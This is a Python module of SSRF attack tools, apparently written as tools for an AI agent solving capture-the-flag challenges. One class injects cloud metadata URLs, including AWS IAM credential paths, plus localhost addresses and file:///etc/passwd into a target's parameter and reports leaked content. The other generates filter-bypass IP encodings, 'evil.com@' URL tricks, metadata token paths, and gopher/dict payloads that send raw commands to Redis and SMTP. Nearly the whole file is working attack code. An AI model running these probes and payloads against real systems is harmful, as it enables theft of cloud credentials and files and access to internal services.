"""
SSRF (Server-Side Request Forgery) detection and exploitation tools for CTF solving.

Provides utilities for detecting SSRF vulnerabilities and generating bypass payloads.
"""

import json
import re
import struct
import socket
from typing import Dict, List, Optional, Tuple
import requests


class SsrfProbeTool:
    """
    SsrfProbeTool: detect Server-Side Request Forgery vulnerabilities.

    Tool interface (FAIR-style):
      - `name` and `description` class attributes.
      - `.use(tool_input: str) -> str`, where tool_input is JSON.

    Expected JSON tool_input format:

        {
          "url": "http://target.com/fetch",
          "param": "url",                      # parameter to inject SSRF URLs into
          "method": "GET",                     # optional: GET or POST (default GET)
          "data": {"other": "value"},          # optional extra form data
          "targets": "all",                    # optional: cloud/internal/protocols/all (default all)
          "timeout": 10                        # optional timeout in seconds
        }

    The tool injects internal/metadata URLs into the specified parameter
    and analyzes responses to detect SSRF vulnerabilities.
    """

    name: str = "ssrf_probe"
    description: str = (
        "Detect Server-Side Request Forgery (SSRF) vulnerabilities. Input must be JSON "
        "with 'url' (target endpoint) and 'param' (parameter to inject into). Optionally "
        "provide 'method' (GET/POST), 'data' (extra form fields), 'targets' "
        "(cloud/internal/protocols/all), and 'timeout'. The tool injects internal/metadata "
        "URLs and detects SSRF by analyzing response differences."
    )

    # Cloud metadata endpoint targets
    CLOUD_TARGETS = [
        ("http://169.254.169.254/latest/meta-data/", "AWS metadata"),
        ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AWS IAM credentials"),
        ("http://metadata.google.internal/computeMetadata/v1/", "GCP metadata"),
        ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "Azure metadata"),
        ("http://169.254.169.254/metadata/v1/", "DigitalOcean metadata"),
    ]

    # Internal service targets
    INTERNAL_TARGETS = [
        ("http://127.0.0.1", "localhost (127.0.0.1)"),
        ("http://127.0.0.1:8080", "localhost:8080"),
        ("http://127.0.0.1:3000", "localhost:3000"),
        ("http://127.0.0.1:5000", "localhost:5000"),
        ("http://localhost", "localhost (hostname)"),
        ("http://[::1]", "localhost (IPv6)"),
    ]

    # Protocol handler targets
    PROTOCOL_TARGETS = [
        ("file:///etc/passwd", "file:// /etc/passwd"),
        ("file:///etc/hosts", "file:// /etc/hosts"),
        ("file:///proc/self/environ", "file:// /proc/self/environ"),
        ("dict://127.0.0.1:6379/INFO", "dict:// Redis"),
        ("gopher://127.0.0.1:25/", "gopher:// SMTP"),
    ]

    # Detection patterns for cloud metadata
    CLOUD_INDICATORS = [
        "ami-id", "instance-id", "availability-zone", "iam",
        "computeMetadata", "RUNNING",
    ]

    # Detection patterns for file content
    FILE_INDICATORS = [
        "root:x:0:0:", "localhost", "DOCUMENT_ROOT",
    ]

    # Flag patterns
    FLAG_PATTERNS = [
        r"flag\{[^}]+\}", r"FLAG\{[^}]+\}", r"CTF\{[^}]+\}",
        r"ctf\{[^}]+\}", r"picoCTF\{[^}]+\}", r"HTB\{[^}]+\}",
    ]

    def __init__(self, session: Optional[requests.Session] = None):
        self.session = session or requests.Session()

    def use(self, tool_input: str) -> str:
        # Parse JSON input
        try:
            data = json.loads(tool_input) if tool_input else {}
        except json.JSONDecodeError as exc:
            return f"[SsrfProbeTool] Error: tool_input must be JSON. Decoding failed with: {exc}"

        url = data.get("url", "").strip()
        param = data.get("param", "").strip()
        method = data.get("method", "GET").upper()
        extra_data = data.get("data", {})
        targets = data.get("targets", "all").lower()
        timeout = data.get("timeout", 10)

        if not url:
            return "[SsrfProbeTool] Error: 'url' is required."
        if not param:
            return "[SsrfProbeTool] Error: 'param' is required."
        if method not in ["GET", "POST"]:
            return f"[SsrfProbeTool] Error: 'method' must be GET or POST, got '{method}'."

        try:
            return self._probe_ssrf(url, param, method, extra_data, targets, timeout)
        except requests.RequestException as e:
            return f"[SsrfProbeTool] Request error: {e}"
        except Exception as e:
            return f"[SsrfProbeTool] Error: {e}"

    def _make_request(
        self,
        url: str,
        method: str,
        param: str,
        payload: str,
        extra_data: dict,
        timeout: int,
    ) -> requests.Response:
        """Make request with payload injected into parameter."""
        if method == "GET":
            params = {param: payload, **extra_data}
            return self.session.get(url, params=params, timeout=timeout)
        else:
            form_data = {param: payload, **extra_data}
            return self.session.post(url, data=form_data, timeout=timeout)

    def _check_for_flags(self, text: str) -> Optional[str]:
        """Check response text for CTF flag patterns."""
        for pattern in self.FLAG_PATTERNS:
            match = re.search(pattern, text)
            if match:
                return match.group(0)
        return None

    def _probe_ssrf(
        self,
        url: str,
        param: str,
        method: str,
        extra_data: dict,
        targets: str,
        timeout: int,
    ) -> str:
        """Probe for SSRF vulnerabilities."""
        results = []
        findings = []

        results.append("[SsrfProbeTool] SSRF Detection Scan")
        results.append("=" * 50)
        results.append(f"URL: {url}")
        results.append(f"Method: {method}")
        results.append(f"Parameter: {param}")
        results.append(f"Target categories: {targets}")
        results.append("")

        # Get baseline response
        try:
            baseline = self._make_request(
                url, method, param, "http://example.com", extra_data, timeout
            )
            baseline_text = baseline.text
            baseline_len = len(baseline_text)
            baseline_status = baseline.status_code
            results.append(f"Baseline response: {baseline_status}, {baseline_len} bytes")
        except Exception as e:
            return f"[SsrfProbeTool] Error: Could not get baseline response: {e}"

        results.append("")

        # Build target list based on category
        target_list = []
        if targets in ["cloud", "all"]:
            target_list.extend(self.CLOUD_TARGETS)
        if targets in ["internal", "all"]:
            target_list.extend(self.INTERNAL_TARGETS)
        if targets in ["protocols", "all"]:
            target_list.extend(self.PROTOCOL_TARGETS)

        # Test each target
        for target_url, desc in target_list:
            try:
                resp = self._make_request(
                    url, method, param, target_url, extra_data, timeout
                )
                resp_text = resp.text

                # Check for flags
                flag = self._check_for_flags(resp_text)
                if flag:
                    findings.append(f"[FLAG] {flag}")
                    results.append(f"[!!!] FLAG FOUND via {desc}: {flag}")
                    continue

                # Check for cloud metadata indicators
                for indicator in self.CLOUD_INDICATORS:
                    if indicator in resp_text:
                        findings.append(f"cloud:{desc}")
                        results.append(f"[+] SSRF DETECTED ({desc}): Found '{indicator}'")
                        snippet = resp_text[:200].replace("\n", " ")
                        results.append(f"    Response snippet: {snippet}...")
                        break

                # Check for file content indicators
                for indicator in self.FILE_INDICATORS:
                    if indicator in resp_text:
                        findings.append(f"file:{desc}")
                        results.append(f"[+] SSRF DETECTED ({desc}): Found '{indicator}'")
                        snippet = resp_text[:200].replace("\n", " ")
                        results.append(f"    Response snippet: {snippet}...")
                        break

                # Check for internal service indicators (response differs from baseline)
                if resp_text != baseline_text:
                    resp_len = len(resp_text)
                    if abs(resp_len - baseline_len) > 50:
                        # Check if response contains HTML or JSON data
                        if any(marker in resp_text for marker in ["<html", "<HTML", "{", "<!DOCTYPE"]):
                            findings.append(f"internal:{desc}")
                            results.append(
                                f"[+] SSRF DETECTED ({desc}): Response differs from baseline "
                                f"({resp_len} vs {baseline_len} bytes) and contains HTML/JSON"
                            )

            except Exception as e:
                results.append(f"[!] Error testing {desc}: {e}")

        results.append("")

        # Summary
        results.append("=== Summary ===")
        if findings:
            results.append(f"[!] SSRF VULNERABILITY DETECTED! ({len(findings)} finding(s))")
            for finding in findings:
                results.append(f"  - {finding}")
        else:
            results.append("[-] No obvious SSRF vulnerability detected")
            results.append("[*] Consider trying:")
            results.append("    1. IP bypass techniques (use ssrf_payload_generator ip_bypass)")
            results.append("    2. Different parameters")
            results.append("    3. URL encoding")
            results.append("    4. Double URL encoding")

        return "\n".join(results)


class SsrfPayloadGenerator:
    """
    SsrfPayloadGenerator: generate SSRF bypass payloads.

    Tool interface (FAIR-style):
      - `name` and `description` class attributes.
      - `.use(tool_input: str) -> str`, where tool_input is JSON.

    Expected JSON tool_input format:

        {
          "operation": "ip_bypass",           # ip_bypass, cloud_metadata, or protocol_smuggling
          "target_ip": "127.0.0.1",          # optional: IP to obfuscate (default 127.0.0.1)
          "target_port": 80                   # optional: port for protocol payloads
        }

    Operations:
      - ip_bypass: Generate IP obfuscation variants for the target IP
      - cloud_metadata: Complete metadata paths for cloud providers
      - protocol_smuggling: gopher://, dict://, tftp://, ldap:// payloads
    """

    name: str = "ssrf_payload_generator"
    description: str = (
        "Generate SSRF bypass payloads. Input must be JSON with 'operation' "
        "(ip_bypass/cloud_metadata/protocol_smuggling). Optionally provide 'target_ip' "
        "(default 127.0.0.1) and 'target_port'. ip_bypass generates IP obfuscation variants "
        "(decimal, hex, octal, IPv6, domain tricks). cloud_metadata provides complete metadata "
        "paths for AWS/GCP/Azure/DigitalOcean. protocol_smuggling generates gopher/dict/tftp/ldap payloads."
    )

    VALID_OPERATIONS = ["ip_bypass", "cloud_metadata", "protocol_smuggling"]

    def __init__(self):
        pass

    def use(self, tool_input: str) -> str:
        # Parse JSON input
        try:
            data = json.loads(tool_input) if tool_input else {}
        except json.JSONDecodeError as exc:
            return f"[SsrfPayloadGenerator] Error: tool_input must be JSON. Decoding failed with: {exc}"

        operation = data.get("operation", "").lower().strip()
        target_ip = data.get("target_ip", "127.0.0.1").strip()
        target_port = data.get("target_port", 80)

        if not operation:
            return (
                f"[SsrfPayloadGenerator] Error: 'operation' is required. "
                f"Options: {', '.join(self.VALID_OPERATIONS)}"
            )

        if operation not in self.VALID_OPERATIONS:
            return (
                f"[SsrfPayloadGenerator] Error: Unknown operation '{operation}'. "
                f"Options: {', '.join(self.VALID_OPERATIONS)}"
            )

        if operation == "ip_bypass":
            return self._generate_ip_bypass(target_ip, target_port)
        elif operation == "cloud_metadata":
            return self._generate_cloud_metadata()
        elif operation == "protocol_smuggling":
            return self._generate_protocol_smuggling(target_ip, target_port)

        return "[SsrfPayloadGenerator] Error: Unexpected state."

    def _ip_to_decimal(self, ip: str) -> str:
        """Convert dotted IP to decimal integer representation."""
        parts = ip.split(".")
        if len(parts) != 4:
            return ""
        num = 0
        for part in parts:
            num = num * 256 + int(part)
        return str(num)

    def _ip_to_hex(self, ip: str) -> Tuple[str, str]:
        """Convert dotted IP to hex representations."""
        parts = ip.split(".")
        if len(parts) != 4:
            return ("", "")
        num = 0
        for part in parts:
            num = num * 256 + int(part)
        full_hex = hex(num)
        dotted_hex = ".".join(hex(int(p)) for p in parts)
        return full_hex, dotted_hex

    def _ip_to_octal(self, ip: str) -> Tuple[str, str]:
        """Convert dotted IP to octal representations."""
        parts = ip.split(".")
        if len(parts) != 4:
            return ("", "")
        short_octal = ".".join(oct(int(p)) for p in parts)
        long_octal = ".".join(oct(int(p)).replace("0o", "0").zfill(4) for p in parts)
        return short_octal, long_octal

    def _generate_ip_bypass(self, target_ip: str, target_port: int) -> str:
        """Generate IP obfuscation bypass payloads."""
        result = [f"[SsrfPayloadGenerator] IP Bypass Payloads for {target_ip}"]
        result.append("=" * 50)
        result.append("")

        # Decimal representation
        decimal_ip = self._ip_to_decimal(target_ip)
        result.append("=== Decimal ===")
        if decimal_ip:
            result.append(f"http://{decimal_ip}")
        result.append("")

        # Hex representations
        full_hex, dotted_hex = self._ip_to_hex(target_ip)
        result.append("=== Hexadecimal ===")
        if full_hex:
            result.append(f"http://{full_hex}")
        if dotted_hex:
            result.append(f"http://{dotted_hex}")
        result.append("")

        # Octal representations
        short_octal, long_octal = self._ip_to_octal(target_ip)
        result.append("=== Octal ===")
        if short_octal:
            result.append(f"http://{short_octal}")
        if long_octal:
            result.append(f"http://{long_octal}")
        result.append("")

        # IPv6 representations
        result.append("=== IPv6 ===")
        result.append("http://[::1]")
        result.append(f"http://[0:0:0:0:0:ffff:{target_ip}]")
        result.append("http://[::ffff:7f00:1]")
        result.append("")

        # Short forms
        result.append("=== Short Forms ===")
        if target_ip == "127.0.0.1":
            result.append("http://127.1")
        result.append("http://0")
        result.append("")

        # Domain bypass
        result.append("=== Domain Bypass ===")
        result.append(f"http://{target_ip}.nip.io")
        result.append("http://localtest.me")
        result.append("http://spoofed.burpcollaborator.net")
        result.append("")

        # URL tricks
        result.append("=== URL Tricks ===")
        result.append(f"http://evil.com@{target_ip}")
        result.append(f"http://{target_ip}#@evil.com")
        result.append("")

        # Tips
        result.append("=== Tips ===")
        result.append("1. Try URL-encoding the entire URL or parts of it")
        result.append("2. Combine techniques (e.g., hex IP + URL tricks)")
        result.append("3. Try double URL encoding for WAF bypass")
        result.append(f"4. Add port if needed: http://{target_ip}:{target_port}")

        return "\n".join(result)

    def _generate_cloud_metadata(self) -> str:
        """Generate cloud metadata endpoint payloads."""
        result = ["[SsrfPayloadGenerator] Cloud Metadata Payloads"]
        result.append("=" * 50)
        result.append("")

        # AWS
        result.append("=== AWS (IMDSv1) ===")
        result.append("http://169.254.169.254/latest/meta-data/")
        result.append("http://169.254.169.254/latest/meta-data/ami-id")
        result.append("http://169.254.169.254/latest/meta-data/hostname")
        result.append("http://169.254.169.254/latest/meta-data/iam/security-credentials/")
        result.append("http://169.254.169.254/latest/meta-data/iam/security-credentials/{role-name}")
        result.append("http://169.254.169.254/latest/user-data")
        result.append("http://169.254.169.254/latest/dynamic/instance-identity/document")
        result.append("[*] No special headers required for IMDSv1")
        result.append("[*] IMDSv2 requires header: X-aws-ec2-metadata-token")
        result.append("")

        # GCP
        result.append("=== GCP ===")
        result.append("http://metadata.google.internal/computeMetadata/v1/")
        result.append("http://metadata.google.internal/computeMetadata/v1/project/project-id")
        result.append("http://metadata.google.internal/computeMetadata/v1/instance/hostname")
        result.append("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token")
        result.append("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email")
        result.append("[*] Required header: Metadata-Flavor: Google")
        result.append("")

        # Azure
        result.append("=== Azure ===")
        result.append("http://169.254.169.254/metadata/instance?api-version=2021-02-01")
        result.append("http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01")
        result.append("http://169.254.169.254/metadata/instance/network?api-version=2021-02-01")
        result.append("http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/")
        result.append("[*] Required header: Metadata: true")
        result.append("")

        # DigitalOcean
        result.append("=== DigitalOcean ===")
        result.append("http://169.254.169.254/metadata/v1/")
        result.append("http://169.254.169.254/metadata/v1/id")
        result.append("http://169.254.169.254/metadata/v1/hostname")
        result.append("http://169.254.169.254/metadata/v1/region")
        result.append("http://169.254.169.254/metadata/v1/interfaces/")
        result.append("[*] No special headers required")

        return "\n".join(result)

    def _generate_protocol_smuggling(self, target_ip: str, target_port: int) -> str:
        """Generate protocol smuggling payloads."""
        result = ["[SsrfPayloadGenerator] Protocol Smuggling Payloads"]
        result.append("=" * 50)
        result.append("")

        # Gopher
        result.append("=== gopher:// ===")
        result.append(f"gopher://{target_ip}:{target_port}/_GET%20/%20HTTP/1.1%0d%0aHost:%20{target_ip}%0d%0a%0d%0a")
        result.append(f"gopher://{target_ip}:6379/_SET%20payload%20%22test%22%0d%0a")
        result.append(f"gopher://{target_ip}:25/_HELO%20localhost%0d%0aMAIL%20FROM:..%0d%0a")
        result.append("[*] gopher:// allows crafting raw TCP packets")
        result.append("[*] Use URL encoding for CR/LF: %0d%0a")
        result.append("[*] Prefix payload with _ (gopher requires it)")
        result.append("")

        # Dict
        result.append("=== dict:// ===")
        result.append(f"dict://{target_ip}:6379/INFO")
        result.append(f"dict://{target_ip}:6379/CONFIG%20GET%20*")
        result.append(f"dict://{target_ip}:11211/stats")
        result.append("[*] dict:// is useful for Redis/Memcached interaction")
        result.append("[*] One command per request (no multi-line)")
        result.append("")

        # TFTP
        result.append("=== tftp:// ===")
        result.append(f"tftp://{target_ip}/etc/passwd")
        result.append(f"tftp://{target_ip}/flag.txt")
        result.append("[*] tftp:// can read files from TFTP servers")
        result.append("[*] Less commonly supported but can bypass URL scheme filters")
        result.append("")

        # LDAP
        result.append("=== ldap:// ===")
        result.append(f"ldap://{target_ip}:{target_port}/dc=example,dc=com")
        result.append(f"ldap://{target_ip}:389/dc=example,dc=com?cn,sn?sub?(cn=*)")
        result.append("[*] ldap:// can interact with LDAP services")
        result.append("[*] Can exfiltrate data from directory services")

        return "\n".join(result)
